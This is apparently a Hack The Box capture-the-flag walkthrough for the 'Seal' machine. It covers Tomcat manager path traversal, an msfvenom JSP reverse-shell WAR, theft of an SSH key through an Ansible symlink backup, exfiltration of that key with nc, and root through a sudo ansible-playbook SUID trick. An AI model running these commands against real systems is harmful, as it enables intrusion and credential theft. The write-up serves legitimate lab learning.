![image](PWND/Seal.png)

# Enumeration
## NMAP
```bash
# Nmap 7.91 scan initiated Sun Jul 11 01:52:25 2021 as: nmap -vvv -p 22,443,8080 -A -v -oN intial.nmap seal.htb
Nmap scan report for seal.htb (seal.htb)
Host is up, received conn-refused (0.70s latency).
Scanned at 2021-07-11 01:52:28 EDT for 44s

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1FohcrXkoPYUOtmzAh5PlCU2H0+sFcGl6XXS6vX2lLJ3RD2Vd+KlcYtc2wQLjcYJhkFe793jmkogOSh0uI+fKQA9z1Ib3J0vtsIaNkXxvSMPcr54QxXgg1guaM1OQl43ePUADXnB6WqAg8QyF6Nxoa18vboOAu3a8Wn9Qf9iCpoU93d5zQj+FsBKVaDs3zuJkUBRfjsqq7rEMpxqCfkFIeUrJF9MBsQhgsEVUbo1zicWG32m49PgDbKr9yE3lPsV9K4b9ugNQ3zwWW5a1OpOs+r3AxFcu2q65N2znV3/p41ul9+fWXo9pm0jJPJ3V5gZphDkXVZEw16K2hcgQcQJUH7luaVTRpzqDxXaiK/8wChtMXEUjFQKL6snEskkRxCg+uLO6HjI19dJ7sTBUkjdMK58TM5RmK8EO1VvbCAAdlMs8G064pSFKxY/iQjp7VWuaqBUetpplESpIe6Bz+tOyTJ8ZyhkJimFG80iHoKWYI2TOa5FdlXod1NvTIkCLD2U=
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD+SiHX7ZTaXWFgBUKSVlFmMYtqF7Ihjfdc51aEdxFdB3xnRWVYSJd2JhOX1k/9V62eZMhR/4Lc8pJWQJHdSA/c=
|   256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXLlJgua8pjAw5NcWgGDwXoASfUOqUlpeQxd66seKyT
443/tcp  open  ssl/http   syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/localityName=Hackney/organizationalUnitName=Infra/emailAddress=admin@seal.htb
| Issuer: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/localityName=hackney/organizationalUnitName=Infra/emailAddress=admin@seal.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-05T10:24:03
| Not valid after:  2022-05-05T10:24:03
| MD5:   9c4f 991a bb97 192c df5a c513 057d 4d21
| SHA-1: 0de4 6873 0ab7 3f90 c317 0f7b 872f 155b 305e 54ef
| -----BEGIN CERTIFICATE-----
| MIIDiDCCAnACAWQwDQYJKoZIhvcNAQELBQAwgYkxCzAJBgNVBAYTAlVLMQ8wDQYD
| VQQIDAZMb25kb24xEDAOBgNVBAcMB2hhY2tuZXkxFTATBgNVBAoMDFNlYWwgUHZ0
| IEx0ZDEOMAwGA1UECwwFSW5mcmExETAPBgNVBAMMCHNlYWwuaHRiMR0wGwYJKoZI
| hvcNAQkBFg5hZG1pbkBzZWFsLmh0YjAeFw0yMTA1MDUxMDI0MDNaFw0yMjA1MDUx
| MDI0MDNaMIGJMQswCQYDVQQGEwJVSzEPMA0GA1UECAwGTG9uZG9uMRAwDgYDVQQH
| DAdIYWNrbmV5MRUwEwYDVQQKDAxTZWFsIFB2dCBMdGQxDjAMBgNVBAsMBUluZnJh
| MREwDwYDVQQDDAhzZWFsLmh0YjEdMBsGCSqGSIb3DQEJARYOYWRtaW5Ac2VhbC5o
| dGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDafbynnscdjWeuXTrD
| M36rTJ0y2pJpDDFe9ngryz/xw1KsoPfEDrDE0XHc8LVlD9cxXd/8+0feeV34d63s
| YyZ0t5tHlAKw1h9TEa/og1yR1MyxZRf+K/wcX+OwXYFtMHkXCZFH7TPXLKtCrMJM
| Z6GCt3f1ccrI10D+/dMo7eyQJsat/1e+6PgrTWRxImcjOCDOZ1+mlfSkvmr5TUBW
| SU3uil2Qo5Kj9YLCPisjKpVuyhHU6zZ5KuBXkudaPS0LuWQW1LTMyJzlRfoIi9J7
| E2uUQglrTKKyd3g4BhWUABbwyxoj2WBbgvVIdCGmg6l8JPRZXwdLaPZ/FbHEQ47n
| YpmtAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAJZGFznhRSEa2DTgevXl1T8uxpiG
| PPd9R0whiIv3s225ir9SWW3Hl1tVkEY75G4PJA/DxmBIHxIK1OU8kZMuJUevnSIC
| rK16b9Y5Y1JEnaQwfKCoQILMU40ED76ZIJigGqAoniGCim/mwR1F1r1g63oUttDT
| aGLrpvN6XVkqSszpxTMMHk3SqwNaKzsaPKWPGuEbj9GGntRo1ysqZfBttgUMFIzl
| 7un7bBMIn+SPFosNGBmXIU9eyR7zG+TmpGYvTgsw0ZJqZL9yQIcszJQZPV3HuLJ8
| 8srMeWYlzSS1SOWrohny4ov8jpMjWkbdnDNGRMXIUpapho1R82hyP7WEfwc=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  http-proxy syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sun, 11 Jul 2021 05:52:44 GMT
|     Set-Cookie: JSESSIONID=node02tkmu7clkotl14l33hzr4v0s4.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sun, 11 Jul 2021 05:52:40 GMT
|     Set-Cookie: JSESSIONID=node01vkzhqj4ptc0nunyvq8yxxaln2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 11 Jul 2021 05:52:41 GMT
|     Set-Cookie: JSESSIONID=node01hvty6wvcttvashlw16an2say3.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=7/11%Time=60EA8725%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Sun,\x2011\x2
SF:0Jul\x202021\x2005:52:40\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01vkzh
SF:qj4ptc0nunyvq8yxxaln2\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu
SF:,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html
SF:;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,108,"HTT
SF:P/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2011\x20Jul\x202021\x2005:52:41\x
SF:20GMT\r\nSet-Cookie:\x20JSESSIONID=node01hvty6wvcttvashlw16an2say3\.nod
SF:e0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x20
SF:00:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:\x
SF:20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/ht
SF:ml;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\
SF:r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Version
SF:</pre>")%r(FourOhFourRequest,F3,"HTTP/1\.1\x20401\x20Unauthorized\r\nDa
SF:te:\x20Sun,\x2011\x20Jul\x202021\x2005:52:44\x20GMT\r\nSet-Cookie:\x20J
SF:SESSIONID=node02tkmu7clkotl14l33hzr4v0s4\.node0;\x20Path=/;\x20HttpOnly
SF:\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent
SF:-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(S
SF:ocks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nConte
SF:nt-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nCo
SF:nnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x2
SF:0Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x20400
SF:\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;char
SF:set=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n
SF:<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20C
SF:NTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20character
SF:\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 11 01:53:12 2021 -- 1 IP address (1 host up) scanned in 47.56 seconds
```
So the SSL certificate gives you a domain name seal.htb so let's add it in /etc/hosts.
```bash
sudo echo "<MACHINE IP> seal.htb" >> /etc/hosts
```
now that we have that let's visit some ports.
## Port 443
looks like a fancy version of some market for vegetables and store page was almost static except for the search bar and contact us form so let's move on to 
## Port 8080
Visiting port 8080 we have a Gitbucket instance so let's register an account and then login in with it.
After logging in we can see two repos by root infra and seal_market.
From port 443 we have the instance of seal_market over there so that looks intresting so let's move on with that.
Reading the README.md file gives us something intrsting.
```md
Seal Market App
===============
A simple online market application which offers free shopping, avoid crowd in this pandemic situation, saves time. 

## ToDo
* Remove mutual authentication for dashboard, setup registration and login features.
* Deploy updated tomcat configuration.
* Disable manager and host-manager.
```
So First we know that nginx is just relaying the request to backend tomcat server and secondly the configuration for this server is not the newest as shown in the repos so we can search through commit as the older configuration might be vulnerable.
And Lastly we know that we have access to manager and host-manager from the https://seal.htb/ so let's try that.
## Port 443
```bash
kali@kali:~/HackTheBox/Seal$ curl -k https://seal.htb/manager/html
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```
Well we should have access to it as said in the README then I thought maybe we have access to some other endpoint in manager.
So let's fuzz and see we know that it is tomcat so it's better to use specialized wordlist for that.
I am using one from the seclist which you can find at the below link.
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt
### Directory Fuzzing
```bash
kali@kali:~/HackTheBox/Seal$ ffuf -k -u https://seal.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt -t 200 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://seal.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/tomcat.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

examples/../manager/html [Status: 403, Size: 162, Words: 4, Lines: 8]
examples/%2e%2e/manager/html [Status: 403, Size: 162, Words: 4, Lines: 8]
manager/jmxproxy/*      [Status: 401, Size: 2499, Words: 457, Lines: 64]
manager/status.xsd      [Status: 200, Size: 4374, Words: 749, Lines: 85]
host-manager/html/*     [Status: 403, Size: 162, Words: 4, Lines: 8]
manager/html            [Status: 403, Size: 162, Words: 4, Lines: 8]
manager/html/*          [Status: 403, Size: 162, Words: 4, Lines: 8]
manager/jmxproxy        [Status: 401, Size: 2499, Words: 457, Lines: 64]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1]
manager/status/*        [Status: 401, Size: 2499, Words: 457, Lines: 64]
host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1]
:: Progress: [90/90] :: Job [1/1] :: 113 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```
Looks like we can access https://seal.htb/manager/status.xsd
and also we have have https://seal.htb/manager/jmxproxy
and yeah it's asked from creds so let's go on finding those in some previous commit as we know that it is using old tomcat configuration from the README.md file.
Looking through commits on this repo we have 13 commit which wouldn't be much to look through.
http://seal.htb:8080/root/seal_market/commits/master
The commit commit looks intresting in our context which is adding 'adding tomcat configuration' and 'updating tomcat configuration' as we know that updating configuration is probably the current version let's check 'adding tomcat configuration' first.
http://seal.htb:8080/root/seal_market/commit/ac210325afd2f6ae17cce84a8aa42805ce5fd010
we can see the famous Git Diff view so let's hunt for creds in that.
searching  for password using the ctrl+f on the webpage I found this instance of it in tomcat-users.xml
```xml
<?xml version="1.0" encoding="UTF-8"?>
		<!--
		  Licensed to the Apache Software Foundation (ASF) under one or more
		  contributor license agreements.  See the NOTICE file distributed with
		  this work for additional information regarding copyright ownership.
		  The ASF licenses this file to You under the Apache License, Version 2.0
		  (the "License"); you may not use this file except in compliance with
		  the License.  You may obtain a copy of the License at
		 
		      http://www.apache.org/licenses/LICENSE-2.0
		 
		  Unless required by applicable law or agreed to in writing, software
		  distributed under the License is distributed on an "AS IS" BASIS,
		  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		  See the License for the specific language governing permissions and
		  limitations under the License.
		-->
		<tomcat-users xmlns="http://tomcat.apache.org/xml"
		              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
		              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
		              version="1.0">
		<!--
		  NOTE:  By default, no user is included in the "manager-gui" role required
		  to operate the "/manager/html" web application.  If you wish to use this app,
		  you must define such a user - the username and password are arbitrary. It is
		  strongly recommended that you do NOT use one of the users in the commented out
		  section below since they are intended for use with the examples web
		  application.
		-->
		<!--
		  NOTE:  The sample user and role entries below are intended for use with the
		  examples web application. They are wrapped in a comment and thus are ignored
		  when reading this file. If you wish to configure these users for use with the
		  examples web application, do not forget to remove the <!.. ..> that surrounds
		  them. You will also need to set the passwords to something appropriate.
		-->
		<!--
		  <role rolename="tomcat"/>
		  <role rolename="role1"/>
		  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
		  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
		  <user username="role1" password="<must-be-changed>" roles="role1"/>
		-->
		<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
		</tomcat-users>
```
Now we have username and password let's try to login on https://seal.htb/manager/jmxproxy
And boom we are in the manager pannel.
Looking for exploit for tomcat I found an intresting path traversal exploit in tomcat which uses reverse proxy which is the case here as nginx is used as reverse proxy for tomcat running on localhost.
https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/
So from above article we can try directory path traversal to exploit and access forbidden page.
https://seal.htb/manager/jmxproxy/..;/html
this takes us to the home page of tomcat manager.
Now as we can deploy war file we can just get the revershell easily.
# Exploitation
So first let's generate war payload.
```bash
kali@kali:~/HackTheBox/Seal/git/Ghostcat-CNVD-2020-10487$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR IP> LPORT=<YOUR PORT> -f war -o oopsie.war
Payload size: 1104 bytes
Final size of war file: 1104 bytes
Saved as: oopsie.war
```
Now lets upload war file.
![[Pasted image 20210711135338.png]]
Spin up the burpsuite and intercept the request.
![[Pasted image 20210711135425.png]]
you wiill see this request in intercept tab just change the url as we are not allowed to directly access html.
![[Pasted image 20210711135908.png]]
so your final request should look like the above just the url and forward it.
Trriger you rev shell.
```bash
kali@kali:~/HackTheBox/Seal/git/Ghostcat-CNVD-2020-10487$ curl -k 'https://seal.htb/oopsie/'                                                                         






kali@kali:~/HackTheBox/Seal/git/Ghostcat-CNVD-2020-10487$
```
And boom we have the revshell.
```bash
kali@kali:~/HackTheBox/Seal$ sudo rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [<--SNIP-->] from (UNKNOWN) [<--SNIP-->] 52136
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```
# PrivESC to User
## Enumeration
### User's home directory
```bash
ls -al /home/luis
total 51320
drwxr-xr-x 9 luis luis     4096 May  7 07:01 .
drwxr-xr-x 3 root root     4096 May  5 12:52 ..
drwxrwxr-x 3 luis luis     4096 May  7 06:00 .ansible
lrwxrwxrwx 1 luis luis        9 May  5 12:57 .bash_history -> /dev/null
-rw-r--r-- 1 luis luis      220 May  5 12:52 .bash_logout
-rw-r--r-- 1 luis luis     3797 May  5 12:52 .bashrc
drwxr-xr-x 3 luis luis     4096 May  7 07:00 .cache
drwxrwxr-x 3 luis luis     4096 May  5 13:45 .config
drwxrwxr-x 6 luis luis     4096 Jul 10 19:18 .gitbucket
-rw-r--r-- 1 luis luis 52497951 Jan 14 02:51 gitbucket.war
drwxrwxr-x 3 luis luis     4096 May  5 13:41 .java
drwxrwxr-x 3 luis luis     4096 May  5 14:33 .local
-rw-r--r-- 1 luis luis      807 May  5 12:52 .profile
drwx------ 2 luis luis     4096 May  7 06:10 .ssh
-r-------- 1 luis luis       33 Jul 10 19:18 user.txt
```
### ps -aux
looking at the process running this thing caught my eye as there was .ansible directory in luis home directory and there a process running as luis probably a backup service.
```bash
ps -aux
<-----SNIP------>
luis         940  0.0  0.0   2608   604 ?        Ss   Jul10   0:00 /bin/sh -c java -jar /home/luis/gitbucket.war
tomcat    145365  0.0  0.0   2608   536 ?        S    08:27   0:00 /bin/sh
root      147949  0.0  0.0   2608   548 ?        Ss   08:41   0:00 /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
```
### run.yml
```yml
cat /opt/backups/playbook/run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```
The intresting part in this thing is that it also copies the symblink also as it has copy_links=yes. so this gave me an idea to create a symblink of file or folder.
looking at the permission of the folder we have only read only access to it.
```bash
ls -al /var/lib/tomcat9/webapps/ROOT/admin/dashboard
total 100
drwxr-xr-x 7 root root  4096 May  7 09:26 .
drwxr-xr-x 3 root root  4096 May  6 10:48 ..
drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
drwxr-xr-x 2 root root  4096 Mar  7  2015 css
drwxr-xr-x 4 root root  4096 Mar  7  2015 images
-rw-r--r-- 1 root root 71744 May  6 10:42 index.html
drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
drwxrwxrwx 2 root root  4096 May  7 09:26 uploads
```
but if we check the subfolder we have read and write access to it so let's try on that first.
```bash
cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
```
## Exploitation
Now we have to think of what to symlink so we know the user luis have .ssh directory so that might be intresting so let's try that.
```bash
ln -s /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
```
Now wait for it to create the new archive.
After that creates the new archive it usually takes about a minute to do so be patient.
After you have the archive just move it to /dev/shm cause you cannot extract the archive in that folder as it is read only.
```bash
cp backup-2021-<--SNIP-->.gz oops.gz
gzip -kd oops.gz
ls
ls
oops  oops.gz  tmp
tar -xf oops
tar -xf oops
ls
ls
dashboard  oops  oops.gz  tmp
cd dashboard
cd dashboard
ls
ls
bootstrap  css  images  index.html  scripts  uploads
cd uploads
cd uploads
ls
ls
ls -al
ls -al
total 0
drwxr-x--- 3 tomcat tomcat  60 Jul 12 06:53 .
drwxr-x--- 7 tomcat tomcat 160 May  7 09:26 ..
drwx------ 2 tomcat tomcat 100 May  7 06:10 .ssh
```
now we have the SSH directory so let's check it out.
```bash
cd .ssh
ls
ls
authorized_keys  id_rsa  id_rsa.pub
```
now let's get id_rsa and SSH as luis.
in tomcat shell
before executing below command make sure you are listening on that port.
```bash
nc <YOUR IP> <PORT> < id_rsa
```
in your shell
```bash
kali@kali:~/HackTheBox/Seal$ nc -nlvp <PORT> > id_rsa
listening on [any] <--SNIP--> ...
connect to [<--SNIP-->] from (UNKNOWN) [<--SNIP-->] 60546
```
Now that we have id_rsa let's ssh.
```bash
kali@kali:~/HackTheBox/Seal$ ssh -i id_rsa luis@seal.htb
The authenticity of host 'seal.htb (10.129.181.102)' can't be established.
ECDSA key fingerprint is SHA256:YTRJC++A+0ww97kJGc5DWAsnI9iusyCE4Nt9fomhxdA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'seal.htb,10.129.181.102' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 12 Jul 2021 07:02:08 AM UTC

  System load:           0.68
  Usage of /:            46.8% of 9.58GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             180
  Users logged in:       0
  IPv4 address for eth0: 10.129.181.102
  IPv6 address for eth0: dead:beef::250:56ff:feb9:493


0 updates can be applied immediately.


Last login: Fri May  7 07:00:18 2021 from 10.10.14.2
luis@seal:~$
```
Now let's go for root.
# PrivESC to root
## Enumeration
### sudo -l
```bash
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```
Now we can see we can run the command ansible-playbook as root.
This was more easy than the user part as it is just to create a bad yml file and make it run any command as root.
## Exploitation
so let's create a yml file.
```yml
- hosts:localhost  
  tasks:
   - name : oops
     command : chmod +s /bin/bash
```
If you are new to ansible you can refer check the following resource to create a yml file for ansilble
https://www.middlewareinventory.com/blog/ansible-command-examples/
https://docs.ansible.com/ansible/latest/user_guide/playbooks.html
so let's create the above yml file.
```bash
luis@seal:~$ cd /dev/shm/
luis@seal:/dev/shm$ nano oops.yml 
luis@seal:/dev/shm$ cat oops.yml 
- hosts:localhost  
  tasks:
   - name : oops
     command : chmod +s /bin/bash
```
Now let's run this yml file.
```bash
luis@seal:/dev/shm$ sudo /usr/bin/ansible-playbook oops.yml 
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] *****************************************************************************************************************************************************

TASK [Gathering Facts] ***********************************************************************************************************************************************
ok: [localhost]

TASK [oopsie] ********************************************************************************************************************************************************
[WARNING]: Consider using the file module with mode rather than running 'chmod'.  If you need to use command because file is insufficient you can add 'warn: false'
to this command task or set 'command_warnings=False' in ansible.cfg to get rid of this message.
changed: [localhost]

PLAY RECAP ***********************************************************************************************************************************************************
localhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
```
Now Let's run that suid bit /bin/bash
```bash
luis@seal:/dev/shm$ /bin/bash -p
bash-5.0# id
uid=1000(luis) gid=1000(luis) euid=0(root) egid=0(root) groups=0(root),1000(luis)
```
Now we are root so let's get all the flags.
